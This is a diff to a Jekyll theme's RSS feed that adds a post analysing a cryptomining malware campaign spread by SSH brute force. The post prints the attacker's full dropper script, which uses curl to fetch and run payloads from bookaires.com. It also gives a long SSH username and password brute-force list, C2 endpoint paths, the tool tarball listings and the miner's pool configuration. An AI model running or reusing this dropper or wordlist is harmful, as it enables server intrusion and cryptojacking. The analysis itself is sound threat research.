@@ -5,9 +5,362 @@
     <description>Minimalist Jekyll theme for technical writing blog.</description>
     <link>https://heiswayi.github.io/thinkspace/</link>
     <atom:link href="https://heiswayi.github.io/thinkspace/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 02 Dec 2018 23:33:17 +0800</pubDate>
-    <lastBuildDate>Sun, 02 Dec 2018 23:33:17 +0800</lastBuildDate>
+    <pubDate>Sun, 02 Dec 2018 23:42:18 +0800</pubDate>
+    <lastBuildDate>Sun, 02 Dec 2018 23:42:18 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>03cc8d5deeb63e30f5a5d945abf99b00</title>
+        <description>&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .nano
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.nano/
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/remote/nano.sh
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x nano.sh
+./nano.sh
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/...
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/.bin/
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/monero.tgz
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvf monero.tgz
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; monero.tgz
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp/.bin/
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;nohup&lt;/span&gt; ./start &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null &amp;amp;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .vd
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/.sslm
+./sparky.sh 192.168 &amp;amp;
+./rand &amp;amp;
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/min.sh
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/hello
+&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
+&lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;pkill &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;List of files contained in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslm.tgz&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 08:25 .sslm/
+-rwxr-xr-x  0 asoftdoc asoftdoc  764 Aug 24 04:37 .sslm/rx
+-rwxrwxr-x  0 asoftdoc asoftdoc  892 Aug 26 09:08 .sslm/sparky.sh
+drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 09:07 .sslm/tsm/
+-rwxrwxr-x  0 asoftdoc asoftdoc  861 Aug 26 07:33 .sslm/tsm/a
+-rwxr-xr-x  0 asoftdoc asoftdoc  170 Aug 26 07:23 .sslm/tsm/rd
+-rwxr-xr-x  0 asoftdoc asoftdoc 1014456 Dec  7  2017 .sslm/tsm/tsm
+-rwxrwxr-x  0 asoftdoc asoftdoc     368 Aug 26 06:43 .sslm/tsm/bclass.pl
+-rwxrwxr-x  0 asoftdoc asoftdoc      54 Aug 26 08:25 .sslm/tsm/start
+-rwxrwxr-x  0 asoftdoc asoftdoc 1040592 Feb  9  2017 .sslm/haiduc
+-rwxrwxr-x  0 asoftdoc asoftdoc      65 Aug 26 08:27 .sslm/start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tsm&lt;/code&gt; is a SSH service brute force binary known as “TSM - The SSH Machine is your machine by Igor Klopov”.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;haiduc&lt;/code&gt; is a 64-bit ELF binary which is used to brute force, enumerate vulnerable hosts, and execute the initial dropper.&lt;/p&gt;
+
+&lt;p&gt;List of usernames and passwords:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nginx nginx
+oracle oracle
+oracle oracle123
+developer developer
+postgres postgres
+postgres 123456
+deploy deploy
+mysql mysql
+mysql 123456
+minecraft minecraft
+minecraft 123456
+admin qwe123
+admin 123qwe
+oracle 1234
+oracle 123456
+oracle password
+root admin
+root rootroot
+root root1
+root abc@1234
+root root12
+root root123
+root root1234
+root admin123
+root admin1234
+root abc123
+root 123abc
+root password
+root P@ssw0rd
+root Q1w2e3r4
+root !QAZ2wsx
+root pass123
+root pass@123
+root pass1234
+root pass@1234
+root live
+root root
+root 1234
+root 123456
+root 12345678
+user user
+user 1234
+user 123456
+user password
+user live
+user user123
+user 12345
+user 123123
+pi raspberry
+ubuntu ubuntu
+ubuntu password
+ubuntu 1234
+ubuntu 12345
+ubuntu 123456
+ubuntu ubuntu123
+ubuntu qwerty
+ubnt ubnt
+ubnt password
+ubnt 1234
+ubnt 12345
+ubnt 123456
+ubnt ubnt123
+ubnt qwerty
+test test
+postgres posgres
+postgres password
+postgres 1234
+admin admin
+admin password
+admin 1234
+admin 123456
+guest guest
+guest password
+guest 1234
+guest 123456
+jenkins jenkins
+jenkins password
+jenkins jenkinspass
+jenkins 1234
+jenkins 123456
+hadoop hadoop
+hadoop password
+hadoop 1234
+hadoop 123456
+nagios nagios
+nagios password
+nagios 1234
+nagios 123456
+dev dev
+zabbix zabbix
+zabbix 1234
+zabbix 123456
+zabbix P@ssw0rd
+zabbix admin
+zabbix zabbix123
+zabbix zabbix1234
+zabbix password
+student student
+student student123
+ts1 ts1
+ts1 123456
+ts1 12345
+ts1 qwerty
+miner miner
+miner miner123
+miner 123456
+miner 12345
+miner 123123
+miner qwerty
+dev dev123
+dev 123123
+dev 123456
+dev qwerty
+developer developer123
+developer 123456
+developer 12345
+developer 123123
+nobody nobody
+admin qwerty
+admin admin123
+test2 test2
+patrick patrick
+julio julio
+usuario usuario
+utilizador utilizador
+utilisateur utilisateur
+administrator administrator
+administrador administrador
+administrateur administrateur
+teste teste
+tester tester
+prueba prueba
+pruebas pruebas
+testing testing
+hospede hospede
+visitor visitor
+visitante visitante
+visiteur visiteur
+kubuntu kubuntu
+lubuntu lubuntu
+xubuntu xubuntu
+lxde lxde
+superadmin superadmin
+superuser superuser
+developpeur developpeur
+deployer deployer
+support support
+suporte suporte
+soporte soporte
+etudiant etudiant
+estudante estudante
+estudiante estudiante
+teacher teacher
+prof prof
+professeur professeur
+professor professor
+profesor profesor
+server server
+serveur serveur
+servidor servidor
+amazon amazon
+csgoserver csgoserver
+dotaserver dotaserver
+wot wot
+wotserver wotserver
+username username
+ts ts
+test1 test1
+ts2 ts2
+usuario 123456
+utilizador 123456
+utilisateur 123456
+administrator 123456
+administrador 123456
+administrateur 123456
+test 123456
+teste 123456
+tester 123456
+prueba 123456
+pruebas 123456
+testing 123456
+hospede 123456
+visitor 123456
+visitante 123456
+visiteur 123456
+kubuntu 123456
+lubuntu 123456
+xubuntu 123456
+lxde 123456
+superadmin 123456
+superuser 123456
+developpeur 123456
+deploy 123456
+deployer 123456
+support 123456
+suporte 123456
+soporte 123456
+student 123456
+etudiant 123456
+estudante 123456
+estudiante 123456
+teacher 123456
+prof 123456
+professeur 123456
+professor 123456
+profesor 123456
+server 123456
+serveur 123456
+servidor 123456
+amazon 123456
+nobody 123456
+csgoserver 123456
+dotaserver 123456
+wot 123456
+wotserver 123456
+username 123456
+ts 123456
+test1 123456
+test2 123456
+ts2 123456
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rx&lt;/code&gt; is a bash shell script used to get the information such as the brute force password list and target IP classes from the domain name &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Information hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bookaires[.]com/feed/feedp.php - password list
+bookaires[.]com/feed/class.php - IP classes
+bookaires[.]com/info.php - C2 endpoint for retrieving information from the victim
+bookaires[.]com/feed/min.sh - Binary dropper script
+bookaires[.]com/feed/remote/rinfo.php - C2 endpoint for registering new deployed miner
+bookaires[.]com/feed/ips.php - List of target IP addresses
+bookaires[.]com/feed/feedonep.php - Feed one random username and password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;List of files contained in &lt;code class=&quot;highlighter-rouge&quot;&gt;monero.tgz&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 postgres postgres    0 Aug 27 06:32 .bin/
+-rwxrwxr-x  0 postgres postgres  166 Aug 27 06:31 .bin/start
+-rwxrwxr-x  0 postgres postgres 1196 Aug 27 06:29 .bin/.run
+-rwxrwxr-x  0 postgres postgres  511 Aug 27 06:24 .bin/.crondsh
+-rwxrwxr-x  0 postgres postgres  773 Aug 27 06:05 .bin/.config.json
+-rwxr-xr-x  0 postgres postgres 2731128 Apr 27 06:10 .bin/.cnrig
+-rwxr-xr-x  0 postgres postgres  838583 Apr  1  2017 .bin/.h64
+-rwxrwxr-x  0 postgres postgres     773 Aug 27 06:05 .bin/.config.json.big
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The miner &lt;code class=&quot;highlighter-rouge&quot;&gt;cnrig&lt;/code&gt; used is compiled on April 27 2018, version 0.1.5. The binary is renamed to &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt; just before the execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;h64&lt;/code&gt; is a binary known as “XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002”&lt;/p&gt;
+
+&lt;p&gt;Mining server credentials:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    &quot;algo&quot;: &quot;cryptonight&quot;,
+    &quot;api&quot;: {
+        &quot;port&quot;: 0,
+        &quot;access-token&quot;: null,
+        &quot;worker-id&quot;: null,
+        &quot;ipv6&quot;: false,
+        &quot;restricted&quot;: true
+    },
+    &quot;av&quot;: 0,
+    &quot;background&quot;: true,
+    &quot;colors&quot;: true,
+    &quot;cpu-priority&quot;: 0,
+    &quot;donate-level&quot;: 1,
+    &quot;log-file&quot;: null,
+    &quot;max-cpu-usage&quot;: 90,
+    &quot;pools&quot;: [
+        {
+            &quot;url&quot;: &quot;pool.supportxmr.com:5555&quot;,
+            &quot;user&quot;: &quot;42hhyPKkombM6LYEsz6kZe3d1ktHpkkD54Rtv5VZohaAbQAXzmAjkHSDZVWqMm9ieRCjMkijBYhy39ZJrYWVxKDVVqtzwPf&quot;,
+            &quot;pass&quot;: &quot;workx&quot;,
+            &quot;keepalive&quot;: true,
+            &quot;nicehash&quot;: false,
+            &quot;variant&quot;: 1
+        }
+    ],
+    &quot;print-time&quot;: 60,
+    &quot;retries&quot;: 5,
+    &quot;retry-pause&quot;: 5,
+    &quot;safe&quot;: false,
+    &quot;syslog&quot;: false,
+    &quot;threads&quot;: null
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://heiswayi.github.io/thinkspace/2018/03cc8d5deeb63e30f5a5d945abf99b00/</link>
+        <guid isPermaLink="true">https://heiswayi.github.io/thinkspace/2018/03cc8d5deeb63e30f5a5d945abf99b00/</guid>
+        
+        
+      </item>
     
       <item>
         <title>How to Download or Use This Theme</title>
